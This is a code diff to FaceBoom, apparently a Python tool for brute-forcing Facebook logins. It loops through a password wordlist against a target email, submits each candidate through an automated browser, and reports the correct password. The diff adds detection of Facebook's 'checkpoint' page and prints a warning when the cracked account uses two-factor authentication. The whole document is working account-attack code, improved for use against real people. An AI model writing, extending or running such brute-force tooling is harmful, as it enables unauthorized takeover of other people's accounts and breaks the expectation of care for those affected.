@@ -89,7 +89,9 @@ class FaceBoom(object):
             self.br.form['email']=target
             self.br.form['pass']= password
             self.br.method ="POST"
-            return  self.br.submit().get_data().__contains__(b'home_icon')
+            if self.br.submit().get_data().__contains__(b'home_icon'):return  1
+            elif "checkpoint" in self.br.geturl(): return 2
+            return 0
         except(KeyboardInterrupt, EOFError):
             print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
             time.sleep(1.5)
@@ -239,11 +241,13 @@ def Main():
                 passwd = passwd.strip()
                 if len(passwd) <6:continue
                 write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
-                if faceboom.login(target, passwd):
+                retCode = faceboom.login(target, passwd)
+                if retCode:
                     sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                     print(wi+"========================="+"="*len(passwd)+"======")
                     print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
                     print(wi+"========================="+"="*len(passwd)+"======")
+                    if retCode == 2:print(wi+"["+yl+"!"+wi+"]"+yl+" Warning: This account use ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
                     break
                 else:
                     sys.stdout.write(yl+" ==> Login"+rd+" Failed\n")
